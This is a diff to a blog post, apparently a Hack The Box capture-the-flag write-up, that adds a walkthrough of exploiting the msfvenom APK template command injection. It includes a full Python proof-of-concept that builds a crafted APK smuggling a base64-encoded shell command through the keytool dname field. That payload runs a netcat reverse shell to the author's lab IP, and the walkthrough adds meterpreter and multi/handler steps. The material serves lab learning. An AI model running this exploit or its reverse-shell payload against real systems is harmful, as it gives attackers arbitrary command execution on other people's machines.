@@ -169,7 +169,7 @@ sudo msfdb reinit
 sudo msfconsole
 `````
 Finally, we start msfconsole and get the newest version. In my case, I went from 5.0.71 to 6.0.34. We find the exploit, the options are similar but we can add our host IP as well as the listening port. Sadly it still doesn't work.\\
-Let's get back to the web page... There are 3 tools: one that performs a nmap scan, one that encode a payload and one that searches for exploit. Under the hood, the server executes commands such as *sudo nmap given_ip*, *sudo msfvenom [...]*, and *searchsploit given_string*. The one where we encounter errors is the encoder, so let's focus on that. It is kind of out of pure luck and despair that I found something interesting by googling "msfencode vulnerability". Apparently, there is an msfvenom APK Template Command Injection module whoch exploits a vulnerability in msfvenom payload generator when using a crafted APK file as an Android payload template. To trigger the vulnerability, the victim user should do the following: msfvenom -p android/<...> -x.\\
+Let's get back to the web page... There are 3 tools: one that performs a nmap scan, one that encode a payload and one that searches for exploit. Under the hood, the server executes commands such as *sudo nmap given_ip*, *sudo msfvenom [...]*, and *searchsploit given_string*. The one where we encounter errors is the encoder, so let's focus on that. It is kind of out of pure luck and despair that I found something interesting by googling "msfencode vulnerability". Apparently, there is an msfvenom APK Template Command Injection module which exploits a vulnerability in msfvenom payload generator when using a crafted APK file as an Android payload template.\\
 One of the OS options on the website is Android, so that's probably not a coincidence. On the Rapid7's page, there is the command to launch the module in msfconsole:
 
 ````
@@ -184,8 +184,100 @@ The options are the following:
 It's weird that there is no remote host option. I googled "APK template exploit" and found the Github page of the author where he explains it in details and gives a PoC: https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md.\\
 It is said that **when there's a vulnerability in offensive software such as Metasploit, the attacker becomes the victim**.
 
-Explain page, c/c PoC, etc...
+I'll rewrite the description of this command injection vulnerability here to better understand it. The vulnerability arises when using a crafted APK file as an Android payload template. We saw on the website that we can upload a template file, so that sounds good so far. Under the hood, the online tool uses **msfvenom** to generate and encode a payload. Msfvenom allows to provide a template by using the *-x* flag.\\
+For example, we could embed a meterpreter payload within a file called *calc.exe* with the following command:
 
+````
+./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
+````
+
+To generate an Android payload, we give msfvenom an APK template, which is an Android software package. The vulnerability is a command injection that occurs when msfvenom handles these APK files when used as templates.\\
+**An attacker could trick an msfvenom user into using a crafted APK file as a template could execute arbitrary commands on the user's system**. This is exactly what we need! In our case, the server is the msfvenom user who pass it our template file. Our job is thus to create an APK file. It is also mentionned that using any file as a payload template *should* be a safe operation for the attacker because during payload generation, the template is not executed on the attacker's machine. The payload is simply the file within which the generated payload will be embedded.\\
+
+I won't go into the technical details, but here's a modified POC of a python script that produces a crafted APK file that executes a given command-line payload when used as a template. We will call this script *msfvenom_apk_template.py*. Originally, the payload was *'echo "Code execution as $(id)" > /tmp/win'*. Let's try to modify that to get a reverse shell on our machine with the payload *nc -nv 10.10.14.22 4444*. We also 
+
+````
+#!/usr/bin/env python3
+import subprocess
+import tempfile
+import os
+from base64 import b64encode
+
+# Change me
+payload = 'nc -nv 10.10.14.22'
+
+# b64encode to avoid badchars (keytool is picky)
+payload_b64 = b64encode(payload.encode()).decode()
+dname = f"CN='|echo {payload_b64} | base64 -d | sh #"
+
+print(f"[+] Manufacturing evil apkfile")
+print(f"Payload: {payload}")
+print(f"-dname: {dname}")
+print()
+
+tmpdir = tempfile.mkdtemp()
+apk_file = os.path.join(tmpdir, "evil.apk")
+empty_file = os.path.join(tmpdir, "empty")
+keystore_file = os.path.join(tmpdir, "signing.keystore")
+storepass = keypass = "password"
+key_alias = "signing.key"
+
+# Touch empty_file
+open(empty_file, "w").close()
+
+# Create apk_file
+subprocess.check_call(["zip", "-j", apk_file, empty_file])
+
+# Generate signing key with malicious -dname
+subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
+                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])
+
+# Sign APK using our malicious dname
+subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
+                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])
+
+print()
+print(f"[+] Done! apkfile is at {apk_file}")
+print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
+`````
+
+We then give the file execute permissions with *chmod 755 msfvenom_apk_template.py* and we can generate a malicious APK file with *./msfvenom_apk_template.py*. I first had an error "FieNotFoundError: No such file or directory: 'jarsigner': 'jarsigner'. This can be resolved by installing default-jdk with the following command:
+
+````
+sudo apt-get install default-jdk
+`````
+
+Then we run the script:
+
+<div class="img_container">
+![PoC]({{https://jsom1.github.io/}}/_images/htb_sk_poc.png)
+</div>
+
+We can see if it works by uploading this file into the online tool and setting up a listener on port 4444 to catch the revershe shell:
+
+<div class="img_container">
+![Upload evil on site]({{https://jsom1.github.io/}}/_images/htb_sk_evil.png)
+</div>
+
+We then click on generate to make the server execute the msfvenom command and check if we get a shell:
+
+<div class="img_container">
+![Catch rev shell]({{https://jsom1.github.io/}}/_images/htb_sk_shell.png)
+</div>
+
+We have a shell, but we can't execute anything. I also tried with a bind shell, I can connect to it but can't execute any command either. Let's try with Metasploit's multi/handler. We first set the options correctly:
+
+<div class="img_container">
+![multi handler]({{https://jsom1.github.io/}}/_images/htb_sk_multihandler.png)
+</div>
+
+We see it started a listener and we're ready to catch a shell. We reupload the file evil.apk on the server and see what happens:
+
+<div class="img_container">
+![multi handler fail]({{https://jsom1.github.io/}}/_images/htb_sk_multihandlerfail.png)
+</div>
+
+We can use the command *shell* to try to get a better shell, but it didn't work here... Note that in the image above, we didn't specify a payload. Generally, we have a higher chance of success if we do so. We can see the available payloads with *show payloads*. In our case, we know from the web site that it generates a reverse TCP meterpreter shell. We also know the target is running Linux, but not the precise architecture. I tried to set the payload to *linux/x86/meterpreter/reverse_tcp* and *linux/x64/meterpreter/reverse_tcp*, but none of those worked.
 
 
 
